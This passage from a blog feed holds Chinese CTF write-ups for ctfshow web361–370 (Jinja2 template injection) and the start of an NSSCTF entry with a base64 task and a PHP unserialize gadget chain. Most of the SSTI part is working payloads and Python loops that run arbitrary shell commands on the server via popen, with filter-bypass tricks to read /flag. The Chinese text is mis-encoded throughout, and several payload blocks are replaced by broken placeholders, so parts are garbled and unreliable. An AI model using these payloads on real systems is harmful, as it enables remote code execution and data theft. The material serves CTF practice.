class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>â€‹<strong>è¡¥å……ï¼šå‡ ç§æ‰‹æ³•</strong></p><blockquote><ul><li>æ‰‹æ³•ä¸€ï¼špayload os.warp_close ç±» çš„ popen æ–¹æ³•</li><li>?name= <code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></li><li>æ‰‹æ³•äºŒï¼š åˆ©ç”¨ configï¼š</li><li>?name= <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125;</code></li><li>æ‰‹æ³•ä¸‰ï¼š <code>lipsum.__globals__</code> å«æœ‰ os æ¨¡å—ï¼š</li><li>?name= <code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li><li>æ‰‹æ³•ä¸‰ï¼šåˆ©ç”¨ <code>__builtins__</code></li><li>?name= <code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li><li>?name= <code>&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></li></ul></blockquote><h1 id="web362"><a class="markdownIt-Anchor" href="#web362">#</a> web362ï¼š</h1><p>â€‹è¿‡æ»¤äº†æ•°å­— 2ï¼Œ3ï¼Œä¸Šæ²¡æœ‰æ•°å­—çš„ payload å°±è¡Œäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>â€‹å¦å¤–çš„ payloadï¼š</p><ul><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">26</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#å…ˆåˆ©ç”¨ join å’Œ count è¿‡æ»¤å™¨å¾—åˆ°æ•°å­— 2ï¼Œç„¶åå†ç”¨ 66*2 å»å¾—åˆ° 132</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>codeï¿¼<span class="token number">2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">28</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>æˆ–è€…</pre></td></tr><tr><td data-num="3"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">29</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>codeï¿¼<span class="token number">3</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul><p>â€‹payload2ï¼šè¿™é‡Œç”¨ config æ‹¿åˆ°å­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒéº»çƒ¦å°±ä¸å…¨æ¼”ç¤ºäº†ï¼Œåªæ¼”ç¤ºéƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125;&#125;</span><br><span class="line">ç›¸å½“äº</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹payload3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]%&#125;</span><br><span class="line"> </span><br><span class="line">ä½¿ç”¨</span><br><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="web364"><a class="markdownIt-Anchor" href="#web364">#</a> web364ï¼š</h1><p>â€‹è¿‡æ»¤äº†å¼•å·ï¼Œargsï¼ŒåŒæ—¶ä¸å…è®¸ä½¿ç”¨ POST ä¼ å‚ï¼Œä½¿ç”¨ Cookie ä¼ å‚å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][request.cookies.m1](<span class="number">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure><h1 id="web365"><a class="markdownIt-Anchor" href="#web365">#</a> Web365ï¼š</h1><p>â€‹è¿™é‡Œåœ¨ä¸Šä¸€ä¸ªé¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œæ‰€ä»¥å¾—ç”¨åˆ«çš„æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ä¸ªåŠæ³•ï¼Œä¸è¿‡æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå¤±è´¥äº†ä¹‹åç¯å¢ƒå°±åºŸäº†ï¼Œæ¯•ç«Ÿ pop ä¼šåˆ é™¤å¯¹åº”çš„é”®ï¼Œå¯¼è‡´ç¯å¢ƒå´©æºƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web366"><a class="markdownIt-Anchor" href="#web366">#</a> Web366ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜å¤šè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œå¯ä»¥ç”¨ lipsum ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web367"><a class="markdownIt-Anchor" href="#web367">#</a> Web367ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜åˆè¿‡æ»¤äº†ä¸ª osï¼Œç›´æ¥æ‰”ä¸ª payload å§ï¼ŒPayload è§£é‡Šé—® Ai éƒ½å¯ä»¥é—®å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¼ å…¥ Cookieï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure><h1 id="web368"><a class="markdownIt-Anchor" href="#web368">#</a> Web368ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜ï¼Œéœ€è¦ç”¨åˆ° <code>&#123;% %&#125;</code> ï¼Œå› ä¸ºåŒå¤§æ‹¬å·é‡Œçš„ request è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯ <code>&#123;% %&#125;</code>  ä¸­çš„ request æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå’Œä¸Šä¸€ä¸ªé¢˜æ„é€ çš„ payload ä¸€æ ·ï¼Œä¸è¿‡æœ‰ç‚¹æ”¹å˜ï¼Œå°±æ˜¯æ²¡æœ‰ä½¿ç”¨åŒå¤§æ‹¬å·ï¼Œæ‰€ä»¥éœ€è¦ print è¾“å‡ºä»¥ä¸‹ï¼ˆç±»ä¼¼æ— å›æ˜¾ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web369"><a class="markdownIt-Anchor" href="#web369">#</a> Web369ï¼š</h1><p>â€‹è¿™é‡Œç›´æ¥ç»™ request ç»™ ban äº†ï¼Œä¸è¿‡å¯ä»¥è‡ªå·±æ‹¼å­—ç¬¦ä¸²ï¼Œè¿˜ç®—å¥½ï¼Œç›´æ¥ä¸Šæœ€ç»ˆ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹ç€å¾ˆé•¿å¾ˆå”¬äººï¼Œä½†å®é™…ç¡®å®ä¸ç®€å•ï¼Œè¿™ä¸ªæˆ‘ä¼šåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« è¿›è¡Œè€ƒç‚¹æ€»ç»“çš„ï¼Œä¸æ€¥ï¼Œè¿™é‡Œå…ˆç»™ä¸‹è§£é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //æ‹¼æ¥å‡ºpop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //æ‹¼æ¥å‡º_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //æ‹¼æ¥å‡º__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //æ‹¼æ¥å‡º__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;//æ‹¼æ¥å‡º__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;//æ‹¼æ¥å‡º__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;//ä½¿ç”¨<span class="built_in">chr</span>ç±»æ¥è¿›è¡ŒRCEå› ä¸ºç­‰ä¼šè¦<span class="built_in">ascii</span>è½¬å­—ç¬¦</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;//æ‹¼æ¥å‡º/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web370"><a class="markdownIt-Anchor" href="#web370">#</a> Web370ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜è¿‡æ»¤äº†æ•°å­—ï¼Œä¸è¿‡å¯ä»¥ç”¨å…¨è§’æ•°å­—æ¥ç»•è¿‡ï¼Œè½¬æ¢çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥æƒ³è¦è½¬æ¢çš„æ•°å­—å­—ç¬¦ä¸²ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°çš„ payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(ï¼’ï¼”)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web361&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web361&quot;&gt;#&lt;/a&gt; web361ï¼š&lt;/h1&gt;
&lt;p&gt;â€‹		name ä¼ å‚ï¼Œç›´æ¥å¹²ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;tabl</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ä»NSSCTFå¼€å§‹çš„å¤å»ºä¹‹è·¯</title>
    <link href="http://blog.g01den.top/posts/cf99ed43.html"/>
    <id>http://blog.g01den.top/posts/cf99ed43.html</id>
    <published>2025-03-26T14:52:27.000Z</published>
    <updated>2025-05-03T13:02:26.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯"><a class="markdownIt-Anchor" href="#ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯">#</a> ä» NSSCTF å¼€å§‹çš„å¤å»ºä¹‹è·¯</h1><h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€ï¼š</h2><p>â€‹æ‘†çƒ‚äº†æœ‰æ®µæ—¶é—´äº†ï¼Œæ„Ÿè§‰ä¸åº”è¯¥å†ç»§ç»­è¿™æ ·äº†ï¼Œå¼€ä¸ªæ–°å‘ï¼Œè®©æˆ‘æ…¢æ…¢å›å¿†ä¸€äº›å¿˜è®°çš„å†…å®¹ï¼Œæˆ‘çŸ¥é“ä¸åº”è¯¥æ‘†çƒ‚ï¼Œä½†å¿ƒç†é—®é¢˜å¯¼è‡´æˆ‘æ„Ÿè§‰ä¸€åˆ‡éƒ½å¤±å»äº†æ„ä¹‰ï¼Œè¿˜å¥½ï¼Œmaimai è®©æˆ‘è‡³å°‘æœ‰æ´»ä¸‹å»çš„æƒ³æ³•ï¼Œåœ¨å†™è¿™æ®µè¯çš„æ—¶å€™ï¼Œæˆ‘æ­£åœ¨å¬ The Last Page â€“ ARForestï¼Œä¸€åˆ‡çš„ä¸å¦‚æ„éƒ½æœ‰æœ€åä¸€é¡µï¼Œè€Œç°åœ¨ï¼Œæˆ‘å¸Œæœ›æˆ‘çš„ä½è°·æœŸå·²ç»æ¥åˆ°äº† The Last Page ï¼ŒæœŸå¾…æ¥ä¸‹æ¥çš„æ¯ä¸€æ­¥éƒ½ä¼šåƒ The Last Page ä¸€èˆ¬ï¼Œå……æ»¡å¸Œæœ›ï¼Œå……æ»¡ç¾å¥½ã€‚-- å‘ç™«å®Œæ¯•</p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h2><h3 id="swpuctf-2022-æ–°ç”Ÿèµ›base64"><a class="markdownIt-Anchor" href="#swpuctf-2022-æ–°ç”Ÿèµ›base64">#</a> [SWPUCTF 2022 æ–°ç”Ÿèµ›] base64</h3><p>â€‹IDA æ‰“å¼€åï¼Œshift+f12 æ‰¾åˆ°äº† base64 ç¼–ç çš„ç¼–ç è¡¨ï¼Œè¡¨æ²¡æœ‰ç»è¿‡ä¿®æ”¹ï¼ŒåŒæ—¶æ‰¾åˆ°åŠ å¯†åçš„æ•°æ®ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TlNTQ1RGe2Jhc2VfNjRfTlRXUTRaR0ROQzdOfQ==</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡ base64 è§£ç ä¹‹åå¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;base<span class="built_in">_</span>64<span class="built_in">_</span>NTWQ4ZGDNC7N&#125;</span><br></pre></td></tr></table></figure><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web ï¼š</h2><h3 id="moectf-2021unserialize"><a class="markdownIt-Anchor" href="#moectf-2021unserialize">#</a> [MoeCTF 2021]unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆä» entrance å‡ºå‘ï¼Œååºåˆ—åŒ–å‡ºå‘  <code>__destruct</code>  ï¼Œ è®© start ä½œä¸º springboard å¯è§¦å‘  <code>__call</code> ï¼Œè®©</p><p>springboard  ä¸­çš„ middle ä½œä¸º evil å¯è§¦å‘  <code>__get</code>  ï¼Œä¹‹åå°±æ˜¯ç»™ end ä¼ 